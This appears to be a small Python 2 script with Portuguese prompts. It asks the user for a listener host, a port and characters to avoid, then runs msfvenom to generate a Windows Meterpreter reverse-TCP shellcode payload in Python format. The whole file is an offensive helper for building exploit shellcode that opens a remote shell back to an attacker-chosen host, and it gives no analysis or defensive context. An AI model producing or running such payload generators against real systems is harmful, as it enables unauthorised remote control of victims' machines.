#!/usr/bin/python
#-*-coding: utf-8-*-

import subprocess 

LHOST = raw_input("Entre com seu LHOST: ")
LPORT = raw_input("Entre com seu LPORT: ")
CARAC = raw_input("Entre com seu CARACTERE INVALIDO(Ex: /x00/x01/x02): ")
subprocess.call(['msfvenom','-p','windows/meterpreter/reverse_tcp','LHOST='+LHOST,'LPORT='+LPORT,'-b',CARAC,'-f' + 'python'])
 
